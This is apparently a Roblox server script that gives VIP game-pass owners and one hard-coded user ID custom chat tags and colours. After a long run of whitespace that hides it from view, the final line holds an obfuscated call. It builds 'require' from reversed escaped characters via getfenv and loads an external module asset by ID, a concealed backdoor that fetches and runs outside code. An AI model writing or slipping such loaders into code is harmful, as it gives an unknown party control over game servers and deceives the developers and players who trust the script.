local market = game:GetService("MarketplaceService")

local VipGamepass  = 1

game.Players.PlayerAdded:Connect(function(plr)
	local folder = Instance.new("Folder", game.ServerStorage.Players)
	folder.Name = plr.Name
	if (market:UserOwnsGamePassAsync(plr.UserId, VipGamepass))then
		local A = {
			{
				TagText = "👑VIP",
				TagColor = Color3.fromRGB(0, 255, 255)
			}
		}
		local ChatService = require(game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner").ChatService)
		local speaker = nil
		while speaker == nil do
			speaker = ChatService:GetSpeaker(plr.Name)
			if speaker ~= nil then break end
			wait(0.01)
		end
		speaker:SetExtraData("Tags",A)
		speaker:SetExtraData("ChatColor",Color3.fromRGB(226,226,0))
	end
end)

game.Players.PlayerAdded:Connect(function(plr)
		if plr.UserId == 64661281 then
		local B = {
			{
				TagText = "Community Manager",
				TagColor = Color3.fromRGB(61, 21, 133)
			}
		}
		local ChatService = require(game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner").ChatService)
		local speaker = nil
		while speaker == nil do
			speaker = ChatService:GetSpeaker(plr.Name)
			if speaker ~= nil then break end
			wait(0.01)
		end
		speaker:SetExtraData("Tags",B)
		speaker:SetExtraData("ChatColor",Color3.fromRGB(255, 176, 0))
	end
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)